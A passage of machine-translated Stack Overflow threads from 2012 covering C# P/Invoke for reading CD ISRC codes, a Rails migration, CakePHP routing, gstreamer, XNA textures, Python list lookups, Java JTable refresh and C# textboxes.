    /// Most general form of DeviceIoControl Win32 function
    /// </summary>
    /// <param name="hDevice">Handle of device opened with CreateFile, <see cref="Ripper.Win32Functions.CreateFile"/></param>
    /// <param name="IoControlCode">Code of DeviceIoControl operation</param>
    /// <param name="lpInBuffer">Pointer to a buffer that contains the data required to perform the operation.</param>
    /// <param name="InBufferSize">Size of the buffer pointed to by lpInBuffer, in bytes.</param>
    /// <param name="lpOutBuffer">Pointer to a buffer that receives the operation's output data.</param>
    /// <param name="nOutBufferSize">Size of the buffer pointed to by lpOutBuffer, in bytes.</param>
    /// <param name="lpBytesReturned">Receives the size, in bytes, of the data stored into the buffer pointed to by lpOutBuffer. </param>
    /// <param name="lpOverlapped">Pointer to an OVERLAPPED structure. Discarded for this case</param>
    /// <returns>If the function succeeds, the return value is nonzero. If the function fails, the return value is zero.</returns>
    [System.Runtime.InteropServices.DllImport("Kernel32.dll", SetLastError=true)]
    public extern static int DeviceIoControl(IntPtr hDevice, uint IoControlCode, 
      IntPtr lpInBuffer, uint InBufferSize,
      IntPtr lpOutBuffer, uint nOutBufferSize,
      ref uint lpBytesReturned,
      IntPtr lpOverlapped);

    [ StructLayout( LayoutKind.Sequential )]
    public struct TRACK_DATA 
    {
      public  byte  Reserved;
      private byte  BitMapped;
      public  byte  Control 
      { 
        get
        {
          return (byte)(BitMapped & 0x0F);
        }
        set
        {
          BitMapped = (byte)((BitMapped & 0xF0) | (value & (byte)0x0F));
        }
      }
      public byte Adr
      {
        get
        {
          return (byte)((BitMapped & (byte)0xF0) >> 4);
        }
        set
        {
          BitMapped = (byte)((BitMapped & (byte)0x0F) | (value << 4));
        }
      }
      public byte  TrackNumber;
      public byte  Reserved1;
      /// <summary>
      /// Don't use array to avoid array creation
      /// </summary>
      public byte  Address_0;
      public byte  Address_1;
      public byte  Address_2;
      public byte  Address_3;
    };

    public const int MAXIMUM_NUMBER_TRACKS = 100;

    [ StructLayout( LayoutKind.Sequential )]
    public class TrackDataList
    {
      [MarshalAs(UnmanagedType.ByValArray, SizeConst=MAXIMUM_NUMBER_TRACKS*8)]
      private byte[] Data;
      public TRACK_DATA this [int Index]
      {
        get
        {
          if ( (Index < 0) | (Index >= MAXIMUM_NUMBER_TRACKS))
          {
            throw new IndexOutOfRangeException();
          }
          TRACK_DATA res;
          GCHandle handle = GCHandle.Alloc(Data, GCHandleType.Pinned);
          try
          {
            IntPtr buffer = handle.AddrOfPinnedObject();
            buffer = (IntPtr)(buffer.ToInt32() + (Index*Marshal.SizeOf(typeof(TRACK_DATA))));
            res = (TRACK_DATA)Marshal.PtrToStructure(buffer, typeof(TRACK_DATA));
          }
          finally
          {
            handle.Free();
          }
          return res;
        }
      }
      public TrackDataList()
      {
        Data = new byte[MAXIMUM_NUMBER_TRACKS*Marshal.SizeOf(typeof(TRACK_DATA))];
      }
    }

    //Struktur für den Input Parameter:
    public const uint IOCTL_CDROM_TRACK_ISRC = 0x3;

    [StructLayout(LayoutKind.Sequential)]
    public class _CDROM_SUB_Q_DATA_FORMAT
    {
        public byte Format;
        public byte Track;
    }
    //Strukturen für den Output Parameter
    [StructLayout(LayoutKind.Explicit)]
    public class _SUB_Q_CHANNEL_DATA
    {
        [FieldOffset(0)]
        public _SUB_Q_CURRENT_POSITION     CurrentPosition;
        [FieldOffset(0)]
        public _SUB_Q_MEDIA_CATALOG_NUMBER MediaCatalog;
        [FieldOffset(0)]
        public _SUB_Q_TRACK_ISRC TrackIsrc;
    }

    [StructLayout(LayoutKind.Sequential)]
    public class _SUB_Q_CURRENT_POSITION
    {
        public _SUB_Q_HEADER Header;
        public byte          FormatCode;
        //private byte        BitMapped;
        public byte BitMapped;
        //public byte Control
        //{
        //    get
        //    {
        //        return (byte)(BitMapped & 0x0F);
        //    }
        //    set
        //    {
        //        BitMapped = (byte)((BitMapped & 0xF0) | (value & (byte)0x0F));
        //    }
        //}
        //public byte Adr
        //{
        //    get
        //    {
        //        return (byte)((BitMapped & (byte)0xF0) >> 4);
        //    }
        //    set
        //    {
        //        BitMapped = (byte)((BitMapped & (byte)0x0F) | (value << 4));
        //    }
        //}
        public byte          TrackNumber;
        public byte          IndexNumber;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst=4)]
        public byte[]        AbsoluteAddress;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=4)]
        public byte[]        TrackRelativeAddress;
    }

    [StructLayout(LayoutKind.Sequential)]
    public class _SUB_Q_MEDIA_CATALOG_NUMBER
    {
        _SUB_Q_HEADER Header;
        byte        FormatCode;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=3)]
        public byte[]        Reserved;
        //private byte BitMapped;
        public byte BitMapped;
        //public byte Reserved1
        //{
        //    get
        //    {
        //        return (byte)(BitMapped & 0xFE);
        //    }
        //    set
        //    {
        //        BitMapped = (byte)((BitMapped & 0x01) | (value & (byte)0xFE));
        //    }
        //}
        //public byte Mcval
        //{
        //    get
        //    {
        //        return (byte)((BitMapped & (byte)0x01) >> 7);
        //    }
        //    set
        //    {
        //        BitMapped = (byte)((BitMapped & (byte)0xFE) | (value << 7));
        //    }
        //}
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=15)]
        public byte[]  MediaCatalog;
    }

    [StructLayout(LayoutKind.Sequential)]
    public class _SUB_Q_TRACK_ISRC
    {

        public _SUB_Q_HEADER Header;
        public byte FormatCode;
        public byte Reserved0;
        public byte Track;
        public byte Reserved1;
        //private byte BitMapped;
        public byte BitMapped;
        //public byte Reserved2
        //{
        //    get
        //    {
        //        return (byte)(BitMapped & 0xFE);
        //    }
        //    set
        //    {
        //        BitMapped = (byte)((BitMapped & 0x01) | (value & (byte)0xFE));
        //    }
        //}
        //public byte Tcval
        //{
        //    get
        //    {
        //        return (byte)((BitMapped & (byte)0x01) >> 7);
        //    }
        //    set
        //    {
        //        BitMapped = (byte)((BitMapped & (byte)0xFE) | (value << 7));
        //    }
        //}
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=15)]
        public byte[]       TrackIsrc;

    }

    [StructLayout(LayoutKind.Sequential)]
    public class _SUB_Q_HEADER
    {
        public byte Reserved;
        public byte AudioStatus;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=2)]
        public byte[] DataLength;
    }

    [StructLayout( LayoutKind.Sequential )]
    public class CDROM_TOC 
    {
      public ushort Length;
      public byte FirstTrack = 0;
      public byte LastTrack = 0;

      public TrackDataList TrackData;

      public CDROM_TOC()
      {
        TrackData = new TrackDataList();
        Length = (ushort)Marshal.SizeOf(this);
      }
    } 

    [ StructLayout( LayoutKind.Sequential )]
    public class PREVENT_MEDIA_REMOVAL 
    {
      public byte PreventMediaRemoval = 0;
    }

    public enum TRACK_MODE_TYPE { YellowMode2, XAForm2, CDDA }
    [ StructLayout( LayoutKind.Sequential )]
      public class RAW_READ_INFO 
    {
      public long  DiskOffset = 0;
      public uint  SectorCount = 0;
      public TRACK_MODE_TYPE  TrackMode = TRACK_MODE_TYPE.CDDA;
    }

    /// <summary>
    /// Overload version of DeviceIOControl to read the TOC (Table of contents)
    /// </summary>
    /// <param name="hDevice">Handle of device opened with CreateFile, <see cref="Ripper.Win32Functions.CreateFile"/></param>
    /// <param name="IoControlCode">Must be IOCTL_CDROM_READ_TOC for this overload version</param>
    /// <param name="InBuffer">Must be <code>IntPtr.Zero</code> for this overload version </param>
    /// <param name="InBufferSize">Must be 0 for this overload version</param>
    /// <param name="OutTOC">TOC object that receive the CDROM TOC</param>
    /// <param name="OutBufferSize">Must be <code>(UInt32)Marshal.SizeOf(CDROM_TOC)</code> for this overload version</param>
    /// <param name="BytesReturned">Receives the size, in bytes, of the data stored into OutTOC</param>
    /// <param name="Overlapped">Pointer to an OVERLAPPED structure. Discarded for this case</param>
    /// <returns>If the function succeeds, the return value is nonzero. If the function fails, the return value is zero.</returns>
    [System.Runtime.InteropServices.DllImport("Kernel32.dll", SetLastError=true)]
    public extern static int DeviceIoControl(IntPtr hDevice, uint IoControlCode, 
      IntPtr InBuffer, uint InBufferSize,
      [Out] CDROM_TOC OutTOC, uint OutBufferSize,
      ref uint BytesReturned,
      IntPtr Overlapped);

    /// <summary>
    /// Overload version of DeviceIOControl to lock/unlock the CD
    /// </summary>
    /// <param name="hDevice">Handle of device opened with CreateFile, <see cref="Ripper.Win32Functions.CreateFile"/></param>
    /// <param name="IoControlCode">Must be IOCTL_STORAGE_MEDIA_REMOVAL for this overload version</param>
    /// <param name="InMediaRemoval">Set the lock/unlock state</param>
    /// <param name="InBufferSize">Must be <code>(UInt32)Marshal.SizeOf(PREVENT_MEDIA_REMOVAL)</code> for this overload version</param>
    /// <param name="OutBuffer">Must be <code>IntPtr.Zero</code> for this overload version </param>
    /// <param name="OutBufferSize">Must be 0 for this overload version</param>
    /// <param name="BytesReturned">A "dummy" varible in this case</param>
    /// <param name="Overlapped">Pointer to an OVERLAPPED structure. Discarded for this case</param>
    /// <returns>If the function succeeds, the return value is nonzero. If the function fails, the return value is zero.</returns>
    [System.Runtime.InteropServices.DllImport("Kernel32.dll", SetLastError=true)]
    public extern static int DeviceIoControl(IntPtr hDevice, uint IoControlCode, 
      [In] PREVENT_MEDIA_REMOVAL InMediaRemoval, uint InBufferSize,
      IntPtr OutBuffer, uint OutBufferSize,
      ref uint BytesReturned,
      IntPtr Overlapped);

    /// <summary>
    /// Overload version of DeviceIOControl to read digital data
    /// </summary>
    /// <param name="hDevice">Handle of device opened with CreateFile, <see cref="Ripper.Win32Functions.CreateFile"</param>
    /// <param name="IoControlCode">Must be IOCTL_CDROM_RAW_READ for this overload version</param>
    /// <param name="rri">RAW_READ_INFO structure</param>
    /// <param name="InBufferSize">Size of RAW_READ_INFO structure</param>
    /// <param name="OutBuffer">Buffer that will receive the data to be read</param>
    /// <param name="OutBufferSize">Size of the buffer</param>
    /// <param name="BytesReturned">Receives the size, in bytes, of the data stored into OutBuffer</param>
    /// <param name="Overlapped">Pointer to an OVERLAPPED structure. Discarded for this case</param>
    /// <returns>If the function succeeds, the return value is nonzero. If the function fails, the return value is zero.</returns>
    [System.Runtime.InteropServices.DllImport("Kernel32.dll", SetLastError=true)]
    public extern static int DeviceIoControl(IntPtr hDevice, uint IoControlCode, 
      [In] RAW_READ_INFO rri, uint InBufferSize,
      [In, Out] byte[] OutBuffer, uint OutBufferSize,
      ref uint BytesReturned,
      IntPtr Overlapped);

    /// <summary>
    /// Overload Version of DeviceIOControl to read ISRC Code from CD for special track
    /// </summary>
    /// <param name="hDevice">Handle of device opened with CreateFile, <see cref="MyISRCReader.Win32Functions.CreateFile"</param>
    /// <param name="IoControlCode">Must be IOCTL_CDROM_READ_Q_CHANNEL</param>
    /// <param name="fmt">_CDROM_SUB_Q_DATA_FORMAT structure </param>
    /// <param name="InBufferSize">Size of _CDROM_SUB_Q_DATA_FORMAT</param>
    /// <param name="OutData">_SUB_Q_CHANNEL_DATA structure</param>
    /// <param name="OutBufferSize">Size of _SUB_Q_CHANNEL_DATA buffer</param>
    /// <param name="BytesReturned">Receives the size, in bytes, of the data stored into OutBuffer</param>
    /// <param name="Overlapped">Pointer to an OVERLAPPED structure. Discarded for this case</param>
    /// <returns>0 if the function fails and nonzero if the function succeeded</returns>
    [System.Runtime.InteropServices.DllImport("Kernel32.dll", SetLastError = true)]
    public extern static int DeviceIoControl(IntPtr hDevice, uint IoControlCode,
      [In] _CDROM_SUB_Q_DATA_FORMAT fmt, uint InBufferSize,
      [In, Out] _SUB_Q_CHANNEL_DATA OutData, uint OutBufferSize,
      ref uint BytesReturned,
      IntPtr Overlapped);
  }
} 
```

这是我的简单测试程序 - 我打开 CD 的句柄并获取我的 cd 的正确轨道数。我的 ISRC-Read 后的错误代码为 1，表示“功能错误”。输出结构数据是所有值 0...

```
namespace MyISRCReader
{    
    class Program
    {
        static void Main(string[] args)
        {
            IntPtr cdHandle = IntPtr.Zero;
            char Drive = 'D';
            Win32Functions.CDROM_TOC Toc = new Win32Functions.CDROM_TOC();
            bool TocValid;

            if (Win32Functions.GetDriveType(Drive + ":\\") == Win32Functions.DriveTypes.DRIVE_CDROM)
            {
                cdHandle = Win32Functions.CreateFile("\\\\.\\" + Drive + ':', Win32Functions.GENERIC_READ, Win32Functions.FILE_SHARE_READ, IntPtr.Zero, Win32Functions.OPEN_EXISTING, 0, IntPtr.Zero);
                if (((int)cdHandle != -1) && ((int)cdHandle != 0))
                {
                    uint Dummy = 0;
                    Win32Functions.DeviceIoControl(cdHandle, Win32Functions.IOCTL_STORAGE_LOAD_MEDIA, IntPtr.Zero, 0, IntPtr.Zero, 0, ref Dummy, IntPtr.Zero);
                    uint BytesRead = 0;
                    TocValid = Win32Functions.DeviceIoControl(cdHandle, Win32Functions.IOCTL_CDROM_READ_TOC, IntPtr.Zero, 0, Toc, (uint)Marshal.SizeOf(Toc), ref BytesRead, IntPtr.Zero) != 0;
                    if (TocValid)
                    {
                        Console.WriteLine("track count: " + (Toc.LastTrack - Toc.FirstTrack + 1));

                        Win32Functions._CDROM_SUB_Q_DATA_FORMAT format = new Win32Functions._CDROM_SUB_Q_DATA_FORMAT();
                        Win32Functions._SUB_Q_CHANNEL_DATA data = new Win32Functions._SUB_Q_CHANNEL_DATA();

                        format.Format = (byte)Win32Functions.IOCTL_CDROM_TRACK_ISRC;
                        format.Track = (byte)2;

                        Console.WriteLine("Last Win32 Error beforde ISRC read: " + Marshal.GetLastWin32Error().ToString());

                        int erg = Win32Functions.DeviceIoControl(cdHandle,
                                                       Win32Functions.IOCTL_CDROM_TRACK_ISRC,
                                                       format,
                                                       (uint)Marshal.SizeOf(format),
                                                       data,
                                                       (uint)Marshal.SizeOf(data),
                                                       ref Dummy,
                                                       IntPtr.Zero);

                        Console.WriteLine("Last Win32 error: " + Marshal.GetLastWin32Error().ToString());
                        if (erg == 0)
                        {
                            //Reading ISRC failed
                            Console.WriteLine("Could not read ISRC!");
                        }
                        else
                        {
                            //Reading ISRC succeeded
                            Console.WriteLine("Tracknumber: " + data.TrackIsrc.Track + " - ISRC: " + data.TrackIsrc.TrackIsrc[data.TrackIsrc.Track].ToString());
                        }
                    }
                    else
                    {
                        Console.WriteLine("Toc invalid");
                    }

                }
                else
                {
                    Console.WriteLine("Handle Error");
                }
            }
            Console.Write("Eject media? (y/n)");
            var ch  = Console.ReadKey();
            if (ch.KeyChar == 'y' || ch.KeyChar=='Y')
            {
                uint Dummy = 0;
                Win32Functions.DeviceIoControl(cdHandle, Win32Functions.IOCTL_STORAGE_EJECT_MEDIA, IntPtr.Zero, 0, IntPtr.Zero, 0, ref Dummy, IntPtr.Zero);
            }
            Console.ReadKey();
        }
    }
} 
```

PInvoke 调用和结构（类）是否正确？Win32Functions 中类的注释部分（模拟 C++ 结构）是模拟 C++ 位域的一种替代方法。我不知道如何调试或在哪里可以找到错误...有人有想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-24T10:25:58.310

一种可能性是，当您调用以下行时：

```
int erg = Win32Functions.DeviceIoControl(cdHandle, 
                                         Win32Functions.IOCTL_CDROM_TRACK_ISRC,
                                         format,
                                         (uint)Marshal.SizeOf(format),
                                         data,
                                         (uint)Marshal.SizeOf(data),
                                         ref Dummy,
                                         IntPtr.Zero); 
```

当根据 dllimport 语句期待它们的 IntPtrs 时，您直接传递格式和数据对象。

```
[System.Runtime.InteropServices.DllImport("Kernel32.dll", SetLastError=true)]
public extern static int DeviceIoControl(IntPtr hDevice, 
                                         uint IoControlCode, 
                                         IntPtr lpInBuffer,
                                         uint InBufferSize,
                                         IntPtr lpOutBuffer,
                                         uint nOutBufferSize,
                                         ref uint lpBytesReturned,
                                         IntPtr lpOverlapped); 
```

现在我可能已经预料到某种访问冲突异常，而不是你得到的，但这是一个开始的地方。

另外，您是否确定当您获得格式和数据的大小时，它会返回正确的大小？我看到您将其中之一定义为

```
[StructLayout(LayoutKind.Sequential)]
public class _CDROM_SUB_Q_DATA_FORMAT
{
    public byte Format;
    public byte Track;
} 
```

现在您希望大小为 2 个字节，但实际上它可能会显示为 8，因为默认情况下它会打包大小，以便每个字段从 4 字节边界开始。您可以将 Pack = 1 添加到属性中，以确保它使用最少的字节数。但是您应该仔细检查大小，并确保它们与 C++ 代码中定义的内容相对应。

# flexslider - 使用 flexslider 继续滚动

> ID：12078036
> 
> 赞同：1
> 
> 时间：2012-08-22T17:04:20.133
> 
> 标签：flexslider

我不喜欢animationLoop 为真时，当它到达幻灯片的末尾时，它会快速滚动到开头。我希望它保持一个 continue 循环。我没有看到这个选项，所以我试图在 after 回调中继续将当前幻灯片添加到末尾，但它不起作用。下面是代码。

```
jQuery('.flexslider').flexslider({
    after: function(slider)
    {
        slider.addSlide(slider.slides[slider.currentSlide],slider.count-1);
    }
} 
```

# ruby-on-rails - 移民评论

> ID：12078040
> 
> 赞同：1
> 
> 时间：2012-08-22T17:04:29.860
> 
> 标签：ruby-on-rails, rails-migrations

为客户处理 3.0 rails 项目，我有一个敏感的迁移，我需要在实时生产服务器上运行。它本质上假设将 DB、FL -> fl、PA -> pa 等中的所有州缩写都小写...由于限制，我无法在本地进行测试：调用迁移的措辞有什么影响吗？我知道它与添加和创建等有关，但不确定何时更新这样的信息。

```
rails g migration UpdateStateAbbreviation

def self.up       
  say_with_time "Updating states abbreviation..." do
  State.find(:all).each do |s|
    tmp = s.abbreviation.downcase
    s.update_attribute :abbreviation, tmp
  end
end end

Rake db:migrate 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:46:50.260

迁移的一个非常重要的规则是永远不要在迁移中引用模型。这似乎是一个学术问题，但在未来的某个时候，您可能根本没有`State`模型，当您删除时，`app/models/state.rb`此迁移将不起作用。

无论将来发生什么变化，正确构建的迁移都将正确执行。无论它做什么，以后都可能取消，这没有什么错，但是为失败而设置它绝不是一个好主意。

您可以使用字符串函数在数据库中执行此降级操作，例如：

```
execute "UPDATE states SET abbreviation=LOWER(abbreviation)" 
```

在迁移中使用模型会导致各种问题。这也适用于使用您的模型来预填充某些关键记录。如果`seeds.rb`您必须，甚至更好地`rake`为您完成一项任务，请使用它。

请注意，如果您无法在本地进行测试，那么您的开发过程就会非常有缺陷。您应该始终在适用的情况下运行和测试您的迁移，无论是向上还是向下，以确保它们正常工作。如果出于安全或隐私的原因您无法获得实际的生产数据，请与您的 DBA 合作以获取经过清理的非敏感版本以用于测试目的。例如，州名不应保密。

# cakephp - 在 CakePHP 中的页面加载时从 cookie 向 URL 添加语言前缀

> ID：12078044
> 
> 赞同：1
> 
> 时间：2012-08-22T17:04:32.173
> 
> 标签：cakephp, internationalization

我对 cakePHP 很陌生。我正在使用本教程创建多语言页面：[i18n 多语言教程](http://nuts-and-bolts-of-cakephp.com/2008/11/28/cakephp-url-based-language-switching-for-i18n-and-l10n-internationalization-and-localization/)一切正常，但在页面加载时我需要从 cookie 添加语言前缀（localhost/eng 而不是 localhost/），当我选择一些菜单时会出现此前缀，但是我很头疼如何在页面加载上添加前缀。感谢您的建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-26T23:23:38.887

调用 _setLanguage() 后，您可以在 AppController 中进行重定向。就像是：

```
$this->_setLanguage();
if( $this->here == '/' )
    $this->redirect(array('controller' => 'your_controller', 'action' => 'your_action', 'language' => $this->Session->read('Config.language'))); 
```

# python - 在 gstreamer 中同步两个管道

> ID：12078046
> 
> 赞同：0
> 
> 时间：2012-08-22T17:04:35.203
> 
> 标签：python, gstreamer

我正在 gstreamer 的两个不同管道中播放 2 个视频。我想同步两个视频。你们有什么建议吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T18:17:51.103

取决于同步的含义，源是什么以及管道是什么。如果两者都从不同的源获取数据，除非源以某种形式同步，那么同步两个管道的意思是没有真正意义的

如果您想要的只是它们彼此同步，而不管它们的源偏移量是多少，只要您有一个基于时钟的管道，它们就会保持同步。[假设您正在从两个 USB 摄像头捕获]。只要系统足够快以实时运行 2 个管道，它们就会保持实时。

如果您只想并排显示两者而不考虑它们之间的初始偏移量，请使用 videomixer 并将它们并排放置。它将自动确保两者同步，因为视频将彼此同步移动

如果您希望它们根据时间戳同步，那么您必须使用 RTSP。将两个管道的输出发送到 gstrtpbin 并从单个 gstrtpbin 中获取同步流。这有点不重要。

# xna - 何时在 XNA 中使用 2 纹理的幂？

> ID：12078053
> 
> 赞同：0
> 
> 时间：2012-08-22T17:05:07.837
> 
> 标签：xna, textures

我听说很多 2 纹理的力量出于性能原因更好，但我找不到足够的可靠信息来说明使用 XNA 时是否存在问题。我的大多数纹理都有随机尺寸，我看不出有什么问题，但也许 VS profiler 没有显示出来。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:08:17.457

XNA 实际上是建立在 DirectX 之上的一层。因此，任何适用于此的性能指南也适用于使用 XNA 的任何东西。

VS 分析器也不会真正适用于您正在做的图形特定的事情。这需要通过一些可以检查显卡本身运行情况的工具单独进行分析。如果显卡正在挣扎，它不会显示为 CPU 上的高资源使用率，而是显示为缓慢的渲染速度。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T17:12:59.233

一般来说，pow 2 纹理更好。但大多数显卡应该允许非 pow 2 纹理，而性能损失最小。但是，如果您使用 XNA 范围配置文件，则只允许使用 pow 2 纹理。而一些小型显卡仅支持到达配置文件。

# python - 如果在列表中返回列表中的对象

> ID：12078058
> 
> 赞同：0
> 
> 时间：2012-08-22T17:05:12.490
> 
> 标签：python, list, unique

我想知道是否有一种pythonic方式来执行以下操作：

```
if check_object in list_of_objects:
    return #the object from list
else:
    return check_object 
```

如果在列表中找到匹配的对象，我可以遍历列表以找到匹配的对象，但这似乎有点矫枉过正，有没有更 Pythonic 的方法来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:11:10.383

```
x = ['a', 'b', 'c']
if 'b' in x:
    print x[x.index('b')]
else:
    print 'not found' 
```

您也可以返回对象本身。使用 python >= 2.4：

```
print 'a' in x and 'a' or 'not found' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:31:51.120

我想这会奏效...

```
try:
    idx = list_of_objects.index(check_object)
    return list_of_objects[idx]
except ValueError:
    return check_object 
```

这样做的好处是它只需要在列表中查找对象一次（而不是两次），正如其他一些解决方案所建议的那样。此外，许多人认为“请求宽恕”而不是“先看再跳”更像蟒蛇。（EAFP vs LBYL）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-23T02:43:04.930

“假设这两个对象是库存的一部分，并且您只想要每个对象的一个​​实例，这些对象可能在名称上被认为是相同的，但具有其他不同的属性，因此您想要退回您已经拥有的对象而不是新对象”

但是，您在这里所做的不会实现这一目标。您正在寻找列表中是否存在对象，然后返回相同的对象。当您*测试身份*而不是平等时，*它们不能具有不同的属性。*

 *`list_of_objects`替换为`dict_of_objects`并根据对象的 ID 或名称进行查找可能会更好：

```
# Example class with identifier
class ExampleObject(object):
    def __init__(self, name):
        self.name = name

example1 = ExampleObject('one')

# Object Registry: just convenience methods on a dict for easier lookup
class ObjectRegistry(dict):
    def register(self, object):
        self[object.name] = object

    def lookup(self, object):
        name = getattr(object, 'name', object)
        return self.get(name, object)

# Create the registry and add some objects
dict_of_objects = ObjectRegistry()
dict_of_objects.register(example1)

# Looking up the existing object will return itself
assert dict_of_objects.lookup(example1) is example1

# Looking up a new object with the same name will return the original
example1too = ExampleObject('one')
assert dict_of_objects.lookup(example1too) is example1 
```

因此，检查列表中是否存在将始终返回与匹配项*相同*的项，而比较字典中的键允许您检索*不同*的项。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-08-22T17:13:57.963

```
return check_object if check_object in list_of_objects else None 
```*

# java - 刷新 jTable

> ID：12078061
> 
> 赞同：0
> 
> 时间：2012-08-22T17:05:18.103
> 
> 标签：java, swing, jtable, defaulttablemodel

我似乎无法让我的桌子刷新。我创建了一个刷新按钮，调用`jTable1.repaint();`

```
private void jButton8ActionPerformed(java.awt.event.ActionEvent evt)        
// Reader Refresh
        jTable1.repaint();
    } 
```

我也尝试过`RegistryValues`在按钮中再次调用`RegistryValues.arp(null);`

```
private void jButton8ActionPerformed(java.awt.event.ActionEvent evt)        
// Reader Refresh
        RegistryValues.arp(null);
    } 
```

还尝试组合注册表值并在按钮中重新绘制。

下面是我的代码`jTable`。如果重要的`RegistryValues`话，它们来自另一个使用 JNA 读取注册表的类。

```
jTable1.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {
                {"Protected Mode at Startup", RegistryValues.arp(null)},
                {"Display PDF in browser", RegistryValues.arb(null)},
                {"EULA Accepted?", RegistryValues.are(null)},
                {null, null}
            },
            new String [] {
                "Software", "Status"
            }
        )); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T17:16:38.430

两者都不

```
jTable1.repaint(); 
```

或者

```
RegistryValues.arp(null); 
```

实际上会用新值刷新表。为此，您需要在 ActionListener 中更新当前表模型或设置新模型。

当您使用可变的[DefaultTableModel](http://docs.oracle.com/javase/7/docs/api/javax/swing/table/DefaultTableModel.html)时，您可以为模型创建一个更新帮助器方法。

就像是：

```
DefaultTableModel model = (DefaultTableModel) table.getModel();
model.setValueAt(RegistryValues.arp(null), 0, 1);
// set more row data, etc. 
```

**注意：**您可以将模型保存为类成员变量并消除强制转换的需要。

# c# - C# 文本框访问

> ID：12078062
> 
> 赞同：0
> 
> 时间：2012-08-22T17:05:22.457
> 
> 标签：c#, textbox

我对文本框有一个恼人的问题。我在一个文本框中输入数据，然后单击按钮，我需要在另一个文本框中显示结果。我真的不知道为什么我的方法不起作用。我没有收到任何错误，但它不会显示结果。谢谢！所有文本框都是在运行时动态创建的。这是代码：

```
 private void button2_Click(object sender, EventArgs e)
    {
        TextBox tbox8 = new TextBox();
        tbox8.Name = "textBox8";
        tbox8.Location = new System.Drawing.Point(54 + (0), 55);
        tbox8.Size = new System.Drawing.Size(53, 20);
        this.Controls.Add(tbox8);
        tbox8.BackColor = System.Drawing.SystemColors.InactiveCaption;
        tbox8.TextChanged += new EventHandler(tbox8_TextChanged);

        TextBox tbox9 = new TextBox();
        tbox9.Name = "textBox9";
        tbox9.Location = new System.Drawing.Point(54 + (60), 55);
        tbox9.Size = new System.Drawing.Size(53, 20);
        this.Controls.Add(tbox9);
        tbox9.BackColor = System.Drawing.SystemColors.InactiveCaption;
        tbox9.TextChanged += new EventHandler(tbox9_TextChanged);

     }//button_click

    //input data into texbox8
    TextBox tbox;
    double var1;
    private void tbox8_TextChanged(object sender, EventArgs e)
    {
        tbox = sender as TextBox;
        var1 = Convert.ToDouble(tbox.Text);
    }

    //display the result in textbox9
    TextBox tbox2;
    private void tbox9_TextChanged(object sender, EventArgs e)
    {
        tbox2 = sender as TextBox;
    }

    //perform calculation and on button click display data on referenced textbox
    private void button3_Click(object sender, EventArgs e)
    {
        double result2 = var1 * 2;
        if( tbox2 != null)
        {
            tbox2.Text = result2.ToString(); 
        }      
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T17:15:52.757

这是您的代码，注释掉了不必要的位，并添加了一些新行：

```
TextBox tbox8 = new TextBox(); //make it a member variable
TextBox tbox9 = new TextBox(); //same for this one

private void button2_Click(object sender, EventArgs e)
{
    tbox8.Name = "textBox8";
    tbox8.Location = new System.Drawing.Point(54 + (0), 55);
    tbox8.Size = new System.Drawing.Size(53, 20);
    this.Controls.Add(tbox8);
    tbox8.BackColor = System.Drawing.SystemColors.InactiveCaption;
    tbox8.TextChanged += new EventHandler(tbox8_TextChanged);

    tbox9.Name = "textBox9";
    tbox9.Location = new System.Drawing.Point(54 + (60), 55);
    tbox9.Size = new System.Drawing.Size(53, 20);
    this.Controls.Add(tbox9);
    tbox9.BackColor = System.Drawing.SystemColors.InactiveCaption;
    tbox9.TextChanged += new EventHandler(tbox9_TextChanged);

 }//button_click

//input data into texbox8
//TextBox tbox;
double var1;
private void tbox8_TextChanged(object sender, EventArgs e)
{
    //tbox = sender as TextBox;
    var1 = Convert.ToDouble(tbox8.Text);//tbox8
}

//display the result in textbox9
//TextBox tbox2;//tbox2 is actually tbox9 anyway
private void tbox9_TextChanged(object sender, EventArgs e)
{
//    tbox2 = sender as TextBox;//so we don't need a tbox2
    //do something
}

//perform calculation and on button click display data on referenced textbox
private void button3_Click(object sender, EventArgs e)
{
    double result2 = var1 * 2;
    //if( null != tbox9 ) 
    //{
        tbox9.Text = result2.ToString(); //changed to tbox9
    //}      
} 
```

然而，这仍然存在问题。当用户多次单击 button2 时会发生什么？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:16:16.953

假设 tbox8（尝试使用有意义的名称顺便说一句）是应该输入的文本，而 tbox14 是您期望输出的位置，为什么只在 tbox14 的 TextChanged 事件中设置 tbox2 变量？您的代码可能无法正常工作，因为 tbox2 始终为空，因为您从未为 tbox14 执行 TextChanged 事件。为什么你使用变量 tbox2 而不是只使用 tbox14 呢？

此外，在 tbox8 的 TextChanged 事件中解析文本可能是错误的地方。TextChanged 事件将在每次击键时触发。为什么不在 button3 Click 处理程序中只做一次呢？或者，当它失去焦点时这样做。

试试这个（注意：并不是说这仍然不是糟糕的代码）。首先，摆脱所有 TextChanged 事件，然后：

```
private void button3_Click(object sender, EventArgs e)
{
    var1 = Convert.ToDouble(tbox8.Text);
    double result2 = var1 * 2;
    tbox14.Text = result2.ToString();    
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T18:57:41.797

假设 result * 2 不会导致双精度数的算术溢出，这样的事情应该可以工作。如果输入tbox8的值不能解析成double，点击button3后tbox9显示的结果为0。

由于我没有使用 TextBox 的任何事件，因此我不需要为它们创建处理程序。在单击按钮2后，我还将禁用它，以便无法再次单击它。

